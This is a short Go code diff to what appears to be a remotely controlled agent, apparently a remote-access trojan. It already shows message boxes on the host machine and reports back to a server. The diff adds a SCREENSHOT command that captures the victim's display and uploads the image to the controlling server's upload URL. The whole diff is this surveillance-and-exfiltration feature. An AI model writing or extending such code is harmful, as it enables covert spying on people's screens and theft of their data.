@@ -6,6 +6,7 @@ import (
 	"bytes"
 	"encoding/json"
 	"fmt"
+	"github.com/kbinani/screenshot"
 	"net/http"
 	"os"
 	"path"
@@ -151,6 +152,14 @@ func (w *Worker) resolve(job *Job) {
 	case MSG_BOX:
 		win.ShowInfoDialog(args[0], args[1])
 		w.report(job.Id, "Message shown successfully.")
+	case SCREENSHOT:
+		img, err := screenshot.CaptureRect(screenshot.GetDisplayBounds(0))
+		if err == nil {
+			loc, err := utils.UploadImage(img, "screen", fmt.Sprintf(UPLOADS_URL, w.id))
+			if err == nil {
+				w.report(job.Id, "Screenshot uploaded to "+path.Join(SERVER_ADDR, loc))
+			}
+		}
 	case UNKNOWN:
 		w.report(job.Id, "Received job has wrong format.")
 	}
